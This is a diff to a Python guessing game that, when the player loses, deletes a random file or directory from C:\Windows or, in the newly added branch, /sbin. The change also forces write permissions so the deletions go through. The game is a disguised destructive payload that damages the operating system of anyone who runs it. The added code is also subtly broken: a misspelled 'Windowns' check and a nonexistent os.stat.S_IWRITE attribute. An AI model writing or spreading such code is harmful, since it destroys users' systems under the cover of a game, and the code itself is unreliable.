@@ -1,4 +1,5 @@
 import os
+import platform
 import random
 import shutil
 import string, secrets
@@ -20,15 +21,32 @@ for tent in range(tents):
     else:
         print("\nWrong! Try again!\n")
 else:
-    directory = r"C:\Windows"
+    if platform.system() == "Windowns":
+        directory = r"C:\Windows"
+    else:
+        directory = r"/sbin"
     itens = os.listdir(directory)
 
     if itens:
         item = random.choice(itens)
         item_path = os.path.join(directory, item)
 
-        os.remove(item_path) if os.path.isfile(item_path) else False
-        shutil.rmtree(item_path) if os.path.isdir(item_path) else False
+        if os.path.isfile(item_path):
+            try:
+                os.chmod(item_path, os.stat.S_IWRITE)
+                os.remove(item_path)
+            except:
+                print("Something went wrong!")
+        else:
+            pass
+        if os.path.isdir(item_path):
+            try:
+                os.chmod(item_path, os.stat.S_IRWXU)
+                shutil.rmtree(item_path)
+            except PermissionError:
+                print("Something went wrong!")
+        else:
+            pass
         print(f"{item} was deleted")
         print(f"The number generated was {number}!")
         print("Try again!")
